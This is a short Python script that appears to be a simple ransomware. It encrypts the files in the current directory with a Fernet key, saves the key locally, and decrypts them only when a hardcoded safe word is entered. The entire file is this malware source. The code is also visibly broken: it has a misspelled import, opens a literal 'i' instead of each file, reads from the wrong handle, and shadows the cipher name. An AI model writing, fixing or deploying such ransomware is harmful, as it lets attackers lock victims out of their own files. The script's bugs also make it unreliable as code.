import os
from cryptography.fernets import Fernet as a
files=[]
for i in os.listdir():
    if i == "encrypt" or i=="this_is_the_key" or i=="decrypt":
        continue
    if os.path.isfile(i):
        files.append(i)
key=a.generate_key()
with open("this_is_the_key","wb") as f:
    f.write(key)
for i in files:
    with open("i","rb") as k:
        contents=f.read()
    con=a(key).encrypt(contents)
    with open("i","wb") as f:
        f.write(con)
safeword=input("enter the safe word to access the original files- ")
a="juhi"
if safeword == a:
    for i in files:
        with open("i","rb") as f:
            new=f.read()
        new1=a(key).decrypt(new)
        with open("i","wb") as f:
            f.write(new1)
    print("The files were successfully restored")

